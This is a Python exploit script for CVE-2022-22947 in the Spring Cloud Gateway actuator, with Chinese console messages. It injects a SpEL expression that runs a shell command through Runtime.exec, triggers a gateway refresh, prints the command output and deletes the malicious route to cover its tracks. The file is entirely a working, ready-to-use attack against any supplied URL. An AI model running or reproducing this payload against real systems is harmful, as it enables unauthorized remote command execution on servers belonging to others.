#!/usr/bin/env python
# coding=utf-8

import requests, sys, json
from termcolor import cprint

def CVE_2022_22947(url):
    cprint("================开始对目标URL进行CVE-2022-22947漏洞利用================","green")
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    ## command to execute replace "id" in payload

    payload = '''{\r
              "id": "hacktest",\r
              "filters": [{\r
                "name": "AddResponseHeader",\r
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
                }],\r
              "uri": "http://example.com",\r
              "order": 0\r
            }'''

    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json)
    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2)
    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2)
    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2)
    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2)
    cprint("[+]Payload已经输出，回显结果如下：","magenta")
    print('\n')
    print(re3.text)

def vul(url):
    if ('://' not in url):
        url = str("http://") + str(url)
    if str(url[-1]) != "/":
        url = url + "/"
    CVE_2022_22947(url)
    cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "magenta")
    sys.exit()